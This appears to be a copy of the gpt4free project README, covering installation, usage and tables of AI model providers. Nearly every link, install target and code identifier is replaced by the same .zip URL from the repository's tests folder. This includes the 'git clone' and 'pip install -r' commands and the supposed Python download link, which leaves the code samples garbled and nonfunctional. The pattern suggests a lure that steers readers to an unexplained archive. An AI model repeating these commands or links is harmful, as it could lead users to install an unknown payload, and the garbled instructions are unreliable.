![image](https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip)

By using this repository or any code related to it, you agree to the [legal notice](https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip). The author is not responsible for any copies, forks, or reuploads made by other users. This is the author's only account and repository. To prevent impersonation or irresponsible actions, you may comply with the GNU GPL license this Repository uses.

This (quite censored) New Version of gpt4free, was just released, it may contain bugs, open an issue or contribute a PR when encountering one, some features were disabled.
Docker is for now not available but I would be happy if someone contributes a PR. The g4f GUI will be uploaded soon enough.

### New
- pypi package:
```
pip install -U g4f
```

## Table of Contents:

- [Getting Started](#getting-started)
    + [Prerequisites](#prerequisites)
    + [Setting up the project](#setting-up-the-project)
- [Usage](#usage)
  * [The `g4f` Package](#the-g4f-package)
  * [interference openai-proxy api](#interference-openai-proxy-api-use-with-openai-python-package)
- [Models](#models)
  * [gpt-3.5 / gpt-4](#gpt-35--gpt-4)
  * [Other Models](#other-models)
- [Related gpt4free projects](#related-gpt4free-projects)
- [Contribute](#contribute)
- [ChatGPT clone](#chatgpt-clone)
- [Copyright](#copyright)
- [Copyright Notice](#copyright-notice)
- [Star History](#star-history)

## Getting Started

#### Prerequisites:
1. [Download and install Python](https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip) (Version 3.x is recommended).

#### Setting up the project:
##### Install using pypi
```
pip install -U g4f
```

##### or

1. Clone the GitHub repository: 
```
git clone https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip
```
2. Navigate to the project directory:
```
cd gpt4free
```
3. (Recommended) Create a virtual environment to manage Python packages for your project:
```
python3 -m venv venv
```
4. Activate the virtual environment:
   - On Windows:
   ```
   .\venv\Scripts\activate
   ```
   - On macOS and Linux:
   ```
   source venv/bin/activate
   ```
5. Install the required Python packages from `https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip`:
```
pip install -r https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip
```

6. Create a `https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip` file in the root folder and start using the repo, further Instructions are below
```py
import g4f

...
```

## Usage

### The `g4f` Package
```py
import g4f


print(https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip) # supported args

# Automatic selection of provider

# streamed completion
response = https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip(model='gpt-3.5-turbo', messages=[
                                     {"role": "user", "content": "Hello world"}], stream=True)

for message in response:
    print(message)

# normal response
response = https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip(https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip, messages=[
                                     {"role": "user", "content": "hi"}]) # alterative model setting

print(response)


# Set with provider
response = https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip(model='gpt-3.5-turbo', https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip, messages=[
                                     {"role": "user", "content": "Hello world"}], stream=True)

for message in response:
    print(message)
```

providers:
```py
from https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip import (
    Ails,
    You,
    Bing,
    Yqcloud,
    Theb,
    Aichat,
    Bard,
    Vercel,
    Forefront,
    Lockchat,
    Liaobots,
    H2o,
    ChatgptLogin,
    DeepAi,
    GetGpt
)

# usage:
response = https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip(..., provider=ProviderName)
```

### interference openai-proxy api (use with openai python package)    

run server:
```sh
python3 -m https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip
```

```py
import openai

https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip = ''
https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip = 'http://127.0.0.1:1337'

chat_completion = https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip(stream=True,
    model='gpt-3.5-turbo', messages=[{'role': 'user', 'content': 'write a poem about a tree'}])

#print(https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip[0]https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip)

for token in chat_completion:
    
    content = token['choices'][0]['delta'].get('content')
    if content != None:
        print(content)
```

## Models

### gpt-3.5 / gpt-4

| Website| Provider| gpt-3.5 | gpt-4 | Stream | Status | Auth |
| --- | --- | --- | --- | --- | --- | --- |
| [https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip](https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip) | `https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip` | ✔️ | ❌ | ✔️ | ![Active](https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip) | ❌ |
| [https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip](https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip) | `https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip` | ✔️ | ❌ | ✔️ | ![Inactive](https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip) | ❌ |
| [https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip](https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip) | `https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip` | ❌ | ✔️ | ✔️ | ![Active](https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip) | ❌ |
| [https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip](https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip) | `https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip` | ✔️ | ❌ | ✔️ | ![Inactive](https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip) | ❌ |
| [https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip](https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip) | `https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip` | ✔️ | ❌ | ✔️ | ![Inactive](https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip) | ❌ |
| [https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip](https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip) | `https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip` | ✔️ | ❌ | ❌ | ![Active](https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip) | ❌ |
| [https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip](https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip) | `https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip` | ❌ | ❌ | ❌ | ![Active](https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip) | ✔️ |
| [https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip](https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip) | `https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip` | ✔️ | ❌ | ✔️ | ![Inactive](https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip) | ❌ |
| [https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip](https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip) | `https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip` | ✔️ | ❌ | ✔️ | ![Inactive](https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip) | ❌ |
| [https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip](https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip) | `https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip` | ✔️ | ✔️ | ✔️ | ![Inactive](https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip) | ❌ |
| [https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip](https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip) | `https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip` | ✔️ | ✔️ | ✔️ | ![Inactive](https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip) | ✔️ |
| [https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip](https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip) | `https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip` | ❌ | ❌ | ✔️ | ![Active](https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip) | ❌ |
| [https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip](https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip) | `https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip` | ✔️ | ❌ | ❌ | ![Inactive](https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip) | ❌ |
| [https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip](https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip) | `https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip` | ✔️ | ❌ | ✔️ | ![Active](https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip) | ❌ |
| [https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip](https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip) | `https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip` | ✔️ | ❌ | ✔️ | ![Active](https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip) | ❌ |
| [https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip](https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip) | `https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip` | ✔️ | ❌ | ❌ | ![Active](https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip) | ❌ |
| [https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip](https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip) | `https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip` | ✔️ | ❌ | ✔️ | ![Active](https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip) | ❌ |
| [https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip](https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip) | `https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip` | ✔️ | ❌ | ❌ | ![Inactive](https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip) | ❌ |
| [https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip](https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip) | `https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip` | ✔️ | ❌ | ✔️ | ![Active](https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip) | ❌ |
| [https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip](https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip) | `https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip` | ✔️ | ❌ | ❌ | ![Active](https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip) | ❌ |
| [https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip](https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip) | `https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip` | ✔️ | ✔️ | ✔️ | ![Inactive](https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip) | ❌ |
| [https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip](https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip) | `https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip` | ✔️ | ❌ | ❌ | ![Inactive](https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip) | ❌ |
| [https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip](https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip) | `https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip` | ❌ | ✔️ | ❌ | ![Active](https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip) | ❌ |


### Other Models

| Model| Base Provider | Provider | Website |
| ------- | ----------- | ---- |---- |
| palm2 | Google | `https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip` | [https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip](https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip) |
| falcon-40b | Huggingface | `https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip` | [H2o](https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip) |
| falcon-7b | Huggingface |`https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip` | [H2o](https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip) |
| llama-13b | Huggingface | `https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip`| [H2o](https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip) |
| claude-instant-v1-100k | Anthropic | `https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip` | [https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip](https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip) |
| claude-instant-v1 | Anthropic | `https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip` | [https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip](https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip) |
| claude-v1-100k | Anthropic | `https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip` | [https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip](https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip) |
| claude-v1 | Anthropic | `https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip` | [https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip](https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip) |
| alpaca-7b | Replicate | `https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip` | [https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip](https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip) |
| stablelm-tuned-alpha-7b | Replicate | `https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip` | [https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip](https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip) |
| bloom | Huggingface | `https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip` | [https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip](https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip) |
| bloomz | Huggingface | `https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip` | [https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip](https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip) |
| flan-t5-xxl | Huggingface | `https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip` | [https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip](https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip) |
| flan-ul2 | Huggingface | `https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip` | [https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip](https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip) |
| gpt-neox-20b | Huggingface | `https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip` | [https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip](https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip) |
| oasst-sft-4-pythia-12b-epoch-3.5 |Huggingface | `https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip` | [https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip](https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip) |
| santacoder | Huggingface | `https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip` | [https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip](https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip) |
| command-medium-nightly | Cohere | `https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip` | [https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip](https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip) |
| command-xlarge-nightly | Cohere | `https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip` | [https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip](https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip) |
| code-cushman-001 | OpenAI | `https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip` | [https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip](https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip) |
| code-davinci-002 | OpenAI | `https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip` | [https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip](https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip) |
| text-ada-001 | OpenAI | `https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip` | [https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip](https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip) |
| text-babbage-001 | OpenAI | `https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip` | [https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip](https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip) |
| text-curie-001 | OpenAI | `https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip` | [https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip](https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip) |
| text-davinci-002 | OpenAI | `https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip` | [https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip](https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip) |
| text-davinci-003 | OpenAI | `https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip` | [https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip](https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip) |

## Related gpt4free projects

<table>
  <thead align="center">
    <tr border: none;>
      <td><b>🎁 Projects</b></td>
      <td><b>⭐ Stars</b></td>
      <td><b>📚 Forks</b></td>
      <td><b>🛎 Issues</b></td>
      <td><b>📬 Pull requests</b></td>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><a href="https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip"><b>gpt4free</b></a></td>
